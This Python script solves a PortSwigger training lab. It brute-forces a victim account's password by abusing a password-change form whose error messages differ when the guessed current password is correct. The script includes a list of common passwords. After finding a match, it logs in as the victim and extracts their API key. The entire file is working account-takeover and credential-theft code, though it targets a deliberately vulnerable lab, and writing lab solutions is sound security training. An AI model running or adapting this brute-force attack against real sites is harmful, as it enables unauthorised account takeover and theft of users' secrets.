#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Password brute-force via password change.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PASSWORDS = ["123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567",
             "dragon","123123","baseball","iloveyou","trustno1","1234567890","sunshine","master",
             "123321","letmein","welcome","shadow","monkey","football","michael","batman","abc123",
             "letmein","696969","mustang","access","shadow","master","michael","superman","696969",
             "123qwe","qwerty123","passw0rd","hello","charlie","donald","password1","qwerty1",
             "montoya","carlos","peter","wiener","admin","1q2w3e4r","iloveyou1","monkey","pass"]


def get_csrf(session, url):
    r = session.get(url)
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def main():
    parser = argparse.ArgumentParser(description="Solve Auth Lab 12 (password change brute force)")
    parser.add_argument("lab_url")
    parser.add_argument("--victim", default="carlos")
    args = parser.parse_args()
    lab = args.lab_url.rstrip("/")

    s = requests.Session()
    s.verify = False

    csrf = get_csrf(s, f"{lab}/login")
    s.post(f"{lab}/login", data={"csrf": csrf, "username": "wiener", "password": "peter"})
    print("[*] Logged in as wiener")

    print(f"[*] Brute-forcing {args.victim}'s password via change-password oracle...")
    for password in PASSWORDS:
        csrf = get_csrf(s, f"{lab}/my-account")
        r = s.post(
            f"{lab}/my-account/change-password",
            data={
                "csrf": csrf,
                "username": args.victim,
                "current-password": password,
                "new-password-1": "newpass1",
                "new-password-2": "newpass2"
            }
        )
        if "New passwords do not match" in r.text:
            print(f"[+] Password found: {password}")

            s2 = requests.Session()
            s2.verify = False
            csrf2 = get_csrf(s2, f"{lab}/login")
            s2.post(f"{lab}/login", data={"csrf": csrf2, "username": args.victim, "password": password})
            r2 = s2.get(f"{lab}/my-account")
            m = re.search(r"Your API Key is: ([^<]+)", r2.text)
            if m:
                print(f"[+] API Key: {m.group(1).strip()}")
            print("[+] Lab solved.")
            return

    print("[-] Password not found in wordlist")


if __name__ == "__main__":
    main()
